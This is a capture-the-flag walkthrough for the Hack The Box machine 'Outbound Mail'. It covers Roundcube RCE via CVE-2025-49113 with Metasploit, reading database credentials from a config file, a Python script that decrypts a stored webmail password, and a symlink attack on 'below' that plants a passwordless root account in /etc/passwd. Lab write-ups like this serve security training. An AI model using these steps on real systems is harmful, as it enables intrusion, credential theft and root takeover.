This markdown file provides a complete exploitation walkthrough for the "Outbound Mail" machine on Hack The Box (HTB). It covers initial VPN setup, reconnaissance, exploiting Roundcube Webmail via CVE-2025-49113 for remote code execution (RCE), privilege escalation to user via database credential extraction, and root escalation using CVE-2025-27591 (Below Symlink Attack).

---

## 1. Preparation & Recon

### 1.1 Connect to VPN
```bash
sudo openvpn --config /path/to/htb.ovpn
```

### 1.2 /etc/hosts Configuration
Add the host (replace IP if your instance is different):
```bash
echo "10.10.11.XXX mail.outbound.htb" | sudo tee -a /etc/hosts
```

---

## 2. Initial Enumeration

### 2.1 Nmap Scan
```bash
nmap -sC -sV -oN nmap.txt mail.outbound.htb
```
Open ports:
- 22 (SSH)
- 80 (HTTP)

---

## 3. Foothold: Webmail Access & RCE via CVE-2025-49113

### 3.1 Login to Roundcube Webmail
Open browser:
```
http://mail.outbound.htb/
```
Credentials:
- Username: `tyler`
- Password: `LhKL1o9Nm3X2`

### 3.2 Discover Roundcube Version
On the dashboard, note: **Roundcube v1.6.10**

### 3.3 CVE-2025-49113 — RCE

#### Option A: Metasploit Exploit
Start Metasploit:
```bash
msfconsole
```
Search & use exploit:
```
search roundcube
use exploit/linux/http/roundcube_cve_2025_49113
set LHOST <your_vpn_ip>
set RHOSTS mail.outbound.htb
set USERNAME tyler
set PASSWORD LhKL1o9Nm3X2
exploit
```
Once you have a shell, stabilize it:
```bash
script /dev/null -c bash
```
Outcome: **Shell as www-data**

---

## 4. Privilege Escalation to User

### 4.1 Extract MySQL Credentials from Config File
```bash
cat /var/www/html/roundcube/config/config.inc.php
```
Find:
- MySQL user: `roundcube`
- Password: `RCDBPass2025`
- DES3 decryption key: `rcmail-!24ByteDESkey*Str`

### 4.2 Access MySQL as www-data
```bash
mysql -u roundcube -pRCDBPass2025
```

### 4.3 Database Exploration
```sql
SHOW DATABASES;
USE roundcube;
SHOW TABLES;
SELECT * FROM session;
```
Find encrypted password for user `jacob`.

### 4.4 Decrypt Roundcube Password
Use Python with **pycryptodome**:
```python
from base64 import b64decode
from Crypto.Cipher import DES3

encrypted_password = "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
des_key = b'rcmail-!24ByteDESkey*Str'

data = b64decode(encrypted_password)
iv = data[:8]
ciphertext = data[8:]
cipher = DES3.new(des_key, DES3.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)
cleaned = decrypted.rstrip(b"\x00").rstrip(b"\x08").decode('utf-8', errors='ignore')
print("[+] Pass", cleaned)
```
Result: Jacob's password (plain text).

### 4.5 SSH as jacob
```bash
ssh jacob@mail.outbound.htb
```
Once logged in:
```bash
cat ~/user.txt
```

---

## 5. Root Privilege Escalation (CVE-2025-27591 — Below Symlink Attack)

### 5.1 Sudo Rights Check (as jacob)
```bash
sudo -l
```
Allowed to run `/usr/bin/below` as root.

### 5.2 Check below Version for Vulnerability
```bash
sudo /usr/bin/below live
```
Version: `0.8.0` (vulnerable)

### 5.3 Exploit Symlink Vulnerability
```bash
echo 'spy::0:0:spy:/root:/bin/bash' > /tmp/spyuser
rm -f /var/log/below/error_root.log
ln -s /etc/passwd /var/log/below/error_root.log
sudo /usr/bin/below snapshot --begin now
cp /tmp/spyuser /var/log/below/error_root.log
su spy
```

Now, you are **root**.

### 5.4 Capture the Root Flag
```bash
cat /root/root.txt
```
